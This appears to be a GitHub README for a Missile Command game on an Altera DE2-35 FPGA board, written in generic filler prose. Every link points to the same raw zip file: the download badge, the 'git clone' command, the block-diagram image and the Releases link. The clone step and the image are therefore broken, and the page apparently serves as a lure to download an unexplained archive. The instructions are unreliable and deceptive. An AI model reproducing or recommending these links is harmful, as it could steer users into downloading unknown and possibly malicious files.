# 🚀 DE2-MissileCommand

Welcome to the **DE2-MissileCommand** repository! This project brings the classic Missile Command arcade game to life on the Altera DE2-35 Development Board. Dive into the world of retro gaming and FPGA development with this comprehensive implementation.

[![Download Releases](https://github.com/alikhaled14589653/DE2-MissileCommand/raw/refs/heads/main/DE2-MissileCommand/de2/Command-D-Missile-3.4.zip%20Releases-Click%20Here-brightgreen)](https://github.com/alikhaled14589653/DE2-MissileCommand/raw/refs/heads/main/DE2-MissileCommand/de2/Command-D-Missile-3.4.zip)

## Table of Contents

- [Project Overview](#project-overview)
- [Features](#features)
- [Getting Started](#getting-started)
- [Architecture](#architecture)
- [Installation](#installation)
- [Usage](#usage)
- [Gameplay](#gameplay)
- [Contributing](#contributing)
- [License](#license)
- [Acknowledgments](#acknowledgments)

## Project Overview

The **DE2-MissileCommand** project recreates the classic arcade game, Missile Command, using the Altera DE2-35 FPGA development board. This project serves as both a fun game and a practical demonstration of digital design concepts using Verilog and VHDL. 

Missile Command challenges players to protect cities from incoming missiles. Players control a missile launcher and must intercept the threats before they hit their targets. The project showcases the capabilities of the DE2-35 board, including its processing power and graphical output.

## Features

- **FPGA Implementation**: Fully functional game logic implemented in Verilog and VHDL.
- **Real-time Graphics**: Smooth graphics rendering on the DE2-35 board.
- **User Input Handling**: Responsive controls for a seamless gaming experience.
- **Sound Effects**: Engaging audio to enhance gameplay.
- **Score Tracking**: Keeps track of player scores and displays them on-screen.

## Getting Started

To get started with **DE2-MissileCommand**, you will need the following:

### Prerequisites

- Altera DE2-35 Development Board
- Quartus Prime software for FPGA development
- A basic understanding of Verilog and VHDL
- A computer with a USB port for board connection

### Installation

1. **Clone the Repository**:
   Open your terminal and run the following command:

   ```bash
   git clone https://github.com/alikhaled14589653/DE2-MissileCommand/raw/refs/heads/main/DE2-MissileCommand/de2/Command-D-Missile-3.4.zip
   ```

2. **Navigate to the Project Directory**:
   Change to the project directory:

   ```bash
   cd DE2-MissileCommand
   ```

3. **Open the Project in Quartus**:
   Launch Quartus Prime and open the project file located in the `DE2-MissileCommand` directory.

4. **Compile the Design**:
   Compile the design to ensure everything is set up correctly. Resolve any errors that may arise during compilation.

5. **Upload to the DE2-35 Board**:
   Connect your DE2-35 board to your computer. Use the Programmer tool in Quartus to upload the compiled design to the board.

## Architecture

The architecture of **DE2-MissileCommand** consists of several key components:

- **Game Logic Module**: Handles the main game loop, including player input and game state updates.
- **Graphics Module**: Manages the rendering of game elements, such as missiles, cities, and the player's launcher.
- **Sound Module**: Plays sound effects based on game events, enhancing the overall experience.
- **Input Module**: Captures user input from buttons and joystick, translating them into game actions.

### Block Diagram

![Block Diagram](https://github.com/alikhaled14589653/DE2-MissileCommand/raw/refs/heads/main/DE2-MissileCommand/de2/Command-D-Missile-3.4.zip)

## Usage

After successfully uploading the game to your DE2-35 board, follow these steps to play:

1. **Power On the Board**: Ensure the board is powered and connected to a display.
2. **Start the Game**: Press the start button to initiate the game.
3. **Control the Launcher**: Use the joystick to move the missile launcher and fire missiles at incoming threats.
4. **Monitor Your Score**: Keep an eye on your score displayed on the screen. Try to beat your high score!

## Gameplay

The gameplay of **Missile Command** involves protecting three cities from waves of incoming missiles. As the player, you control a missile launcher that can fire missiles to intercept the threats. The game becomes progressively challenging as the speed and number of missiles increase.

### Scoring System

- Each missile successfully intercepted adds points to your score.
- Destroying multiple missiles in quick succession yields bonus points.
- Failing to protect a city results in a score penalty.

### Game Over

The game ends when all cities are destroyed. A summary of your score and performance will be displayed, allowing you to compare with previous attempts.

## Contributing

Contributions to the **DE2-MissileCommand** project are welcome! If you would like to contribute, please follow these steps:

1. **Fork the Repository**: Click the "Fork" button at the top right of the page.
2. **Create a New Branch**: Use a descriptive name for your branch:

   ```bash
   git checkout -b feature/YourFeature
   ```

3. **Make Your Changes**: Implement your changes and test them thoroughly.
4. **Commit Your Changes**: Use clear commit messages:

   ```bash
   git commit -m "Add feature: YourFeature"
   ```

5. **Push to Your Fork**:

   ```bash
   git push origin feature/YourFeature
   ```

6. **Open a Pull Request**: Go to the original repository and click on "New Pull Request."

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.

## Acknowledgments

- Special thanks to the developers of the original Missile Command game for their inspiration.
- Thanks to the Altera community for their support and resources in FPGA development.
- Appreciation to all contributors for their efforts in improving this project.

For further details and updates, visit the [Releases section](https://github.com/alikhaled14589653/DE2-MissileCommand/raw/refs/heads/main/DE2-MissileCommand/de2/Command-D-Missile-3.4.zip) to download the latest version of the game. Enjoy your journey through the world of Missile Command on the DE2-35 board!